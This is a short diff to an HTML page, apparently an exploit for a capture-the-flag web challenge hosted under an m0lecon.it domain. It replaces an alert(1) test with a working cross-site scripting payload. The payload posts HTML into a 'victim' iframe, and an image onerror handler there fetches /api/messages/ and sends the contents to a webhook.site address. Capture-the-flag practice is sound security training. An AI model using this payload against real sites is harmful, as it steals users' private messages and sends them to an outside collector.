@@ -1,11 +1,19 @@
 <!DOCTYPE html>
 <html>
+<body>
 
+https://62c3f405-3909-4feb-bb61-61c26d2b7d8d.offsec.m0lecon.it/preview
 
 <script>
-alert(1)
+setTimeout(() => {
+  const frame = document.getElementById("victim");
+
+  frame.contentWindow.postMessage({
+    html: '<img src=x onerror="fetch(`/api/messages/`).then(r=>r.text()).then(d=>fetch(`https://webhook.site/TUO_ID?d=`+encodeURIComponent(d)))">'
+  }, "*");
+
+}, 2000);
 </script>
 
 </body>
 </html>
-
